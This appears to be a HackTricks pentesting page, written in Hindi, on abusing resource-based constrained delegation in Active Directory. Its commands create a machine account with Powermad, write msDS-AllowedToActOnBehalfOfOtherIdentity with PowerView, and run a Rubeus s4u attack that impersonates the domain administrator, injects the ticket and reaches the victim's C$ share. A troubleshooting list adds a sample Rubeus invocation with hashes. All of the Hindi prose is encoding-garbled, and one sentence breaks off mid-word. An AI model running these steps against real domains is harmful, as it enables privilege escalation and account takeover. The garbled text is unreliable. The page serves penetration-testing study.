# рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

## рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдХреА рдореВрд▓ рдмрд╛рддреЗрдВ

рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ [рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░](constrained-delegation.md) рдХреА рддрд░рд╣ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдХрд┐рд╕реА **рд╡рд╕реНрддреБ** рдХреЛ **рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрднрд┐рдирдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ** рдХреА рдмрдЬрд╛рдп, рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕рдВрджрд░реНрдн рдореЗрдВ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрднрд┐рдирдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╕реАрдорд┐рдд рд╡рд╕реНрддреБ рдореЗрдВ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ рдирд╛рдордХ рдПрдХ рдЧреБрдг рд╣реЛрдЧрд╛, рдЬрд┐рд╕рдореЗрдВ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛ рдЬреЛ рдЙрд╕рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрднрд┐рдирдп рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рд╕реЗ рдЗрд╕рдХреЗ рдЕрдиреНрдп рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ **рдХрд┐рд╕реА рдорд╢реАрди рдЦрд╛рддреЗ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **msDS-AllowedToActOnBehalfOfOtherIdentity** рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЕрдиреНрдп рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдкрдХреЛ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЕрдзрд┐рдХрд╛рд░ рдЪрд╛рд╣рд┐рдП рдереЗ)ред

### рдирдП рдЕрд╡рдзрд╛рд░рдгрд╛рдПрдВ

рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдореЗрдВ рдпрд╣ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ _userAccountControl_ рдорд╛рди рдХреЗ рднреАрддрд░ _**TrustedToAuthForDelegation**_ рдзреНрд╡рдЬ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдПрдХ **S4U2Self** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рд▓реЗрдХрд┐рди рдпрд╣ рдкреВрд░реНрдгрддрдГ рд╕рдЪ рдирд╣реАрдВ рд╣реИред\
рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЙрд╕ рдорд╛рди рдХреЗ рдмрд┐рдирд╛ рднреА, рдЖрдк рдПрдХ **рд╕реЗрд╡рд╛** (рдПрдХ SPN рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде) рд╣реЛрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ **S4U2Self** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **`TrustedToAuthForDelegation`** рдзреНрд╡рдЬ рд╣реИ рддреЛ рд╡рд╛рдкрд╕ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓рд╛ TGS **Forwardable** рд╣реЛрдЧрд╛ рдФрд░ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡рд╣ рдзреНрд╡рдЬ рдирд╣реАрдВ рд╣реИ рддреЛ рд╡рд╛рдкрд╕ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓рд╛ TGS **Forwardable** рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **S4U2Proxy** рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **TGS** рдореЗрдВ **Forwardable** рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ **рдореВрд▓ рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**ред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк **рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдХрд╛рдо рдХрд░реЗрдЧрд╛ (рдпрд╣ рдХреЛрдИ рд╕рдВрдХрдЯрди рдирд╣реАрдВ рд╣реИ, рдпрд╣ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ, рдЬрд╛рд╣рд┐рд░ рд╣реИ)ред

### рд╣рдорд▓рд╛ рд╕рдВрд░рдЪрдирд╛

> рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА **рдХрдВрдкреНрдпреВрдЯрд░** рдЦрд╛рддреЗ рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдорд╢реАрди рдореЗрдВ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдорд╛рди рд▓реЗрдВ рдХрд┐ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рд╡рд┐рдХреНрдЯрд┐рдо рдХрдВрдкреНрдпреВрдЯрд░** рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреЗ рд╕рдордХрдХреНрд╖ рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВред

1. рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рдЦрд╛рддрд╛ рдХреЛ **рд╕рдВрдХреНрд░рдорд┐рдд** рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **SPN** рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдПрдХ рдЦрд╛рддрд╛ **рдмрдирд╛рддрд╛ рд╣реИ** ("рд╕реЗрд╡рд╛ A")ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЛрдИ рднреА** _рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛_ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рдмрд┐рдирд╛ рддрдХрдиреАрдХреА рдЕрдзрд┐рдХрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрдХрд░реАрдмрди 10 **рдХрдВрдкреНрдпреВ
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## рд╣рдорд▓рд╛

### рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛

рдЖрдк [powermad](https://github.com/Kevin-Robertson/Powermad) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### R**рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рдХрд╛рд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛**

**activedirectory PowerShell рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**рдкрд╛рд╡рд░рд╡реНрдпреВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛ рдХрд░рдирд╛

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдордиреЗ `123456` рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдирдпрд╛ рдХрдВрдкреНрдпреВрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╣реИрд╢ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
рдпрд╣ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП RC4 рдФрд░ AES рд╣реИрд╢ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛ред
рдЕрдм, рд╣рдо рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
рдЖрдк Rubeus рдХреЗ `/altservice` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЗрд╡рд▓ рдПрдХ рдмрд╛рд░ рдкреВрдЫрдХрд░ рдЕрдзрд┐рдХ рдЯрд┐рдХрдЯ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдореЗрдВ "**рдбреЗрд▓реАрдЧреЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛**" рдирд╛рдордХ рдПрдХ рдЧреБрдг рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдпрд╣ рдЧреБрдг рд╕рддреНрдп рд╣реИ, рддреЛ рдЖрдк рдЙрд╕рдХреА рдЕрдиреБрдХрд░рдг рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗред рдпрд╣ рдЧреБрдг bloodhound рдХреЗ рдЕрдВрджрд░ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

![](../../.gitbook/assets/B3.png)

### рдкрд╣реБрдВрдЪ

рдЕрдВрддрд┐рдо рдХрдорд╛рдВрдб рд▓рд╛рдЗрди **рдкреВрд░реНрдг S4U рд╣рдорд▓рд╛ рдХрд░реЗрдЧрд╛ рдФрд░ TGS рдХреЛ рд╡рд┐рдХреНрдЯрд┐рдо рд╣реЛрд╕реНрдЯ рдореЗрдВ рдореЗрдореЛрд░реА рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдЧрд╛**ред\
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ Administrator рд╕реЗ **CIFS** рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдПрдХ TGS рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк **C$** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗред
```bash
ls \\victim.domain.local\C$
```
![](../../.gitbook/assets/b4.png)

### рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВ

[**рдпрд╣рд╛рдВ рдЙрдкрд▓рдмреНрдз рд╕реЗрд╡рд╛ рдЯрд┐рдХрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ**](silver-ticket.md#available-services).

## рдХреЗрд░рдмреЗрд░реЛрд╕ рддреНрд░реБрдЯрд┐рдпрд╛рдБ

* **`KDC_ERR_ETYPE_NOTSUPP`**: рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдХреЗрд░рдмреЗрд░реЛрд╕ рдХреЛ рдбреАрдИрдПрд╕ рдпрд╛ рдЖрд░рд╕реА4 рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЖрдк рдХреЗрд╡рд▓ рдЖрд░рд╕реА4 рд╣реИрд╢ рдкреНрд░рджрд╛рди рдХрд░ рд░рд╣реЗ рд╣реИрдВред Rubeus рдХреЛ рдХрдо рд╕реЗ рдХрдо AES256 рд╣реИрд╢ (рдпрд╛ рдмрд╕ рдЖрд░рд╕реА4, рдПрдПрд╕128 рдФрд░ рдПрдПрд╕256 рд╣реИрд╢) рдкреНрд░рджрд╛рди рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╡рд░реНрддрдорд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдХрд╛ рд╕рдордп DC рдХреЗ рд╕рдордп рд╕реЗ рдЕрд▓рдЧ рд╣реИ рдФрд░ рдХреЗрд░рдмреЗрд░реЛрд╕ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред
* **`preauth_failed`**: рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рджрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо + рд╣реИрд╢ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЖрдкрдиреЗ рд╣реИрд╢ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╕рдордп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореЗрдВ "$" рдбрд╛рд▓рдирд╛ рднреВрд▓ рдЧрдП рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
* рдЖрдк рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдиреБрдХрд░рдг рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдЖрдк рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЙрд╕реЗ рдЕрдиреБрдХрд░рдг рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдпрд╣ рдкрд░реНрдпрд╛рдкреНрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реИ)
* рдЕрдиреБрд░реЛрдзрд┐рдд рд╕реЗрд╡рд╛ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ (рдпрджрд┐ рдЖрдк рд╡рд┐рдирд░реНрдо рдХреЗ рд▓рд┐рдП рдЯрд┐рдХрдЯ рдорд╛рдВрдЧрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╡рд┐рдирд░реНрдо рдирд╣реАрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ)
* рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдлреЗрдХ рдХрдВрдкреНрдпреВрдЯрд░ рд╡рд┐рдХрд▓реНрдкреА рд╕рд░реНрд╡рд░ рдкрд░ рдЕрдкрдиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЦреЛ рдЪреБрдХрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЙрдиреНрд╣реЗрдВ рд╡рд╛рдкрд╕ рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред**

</details>
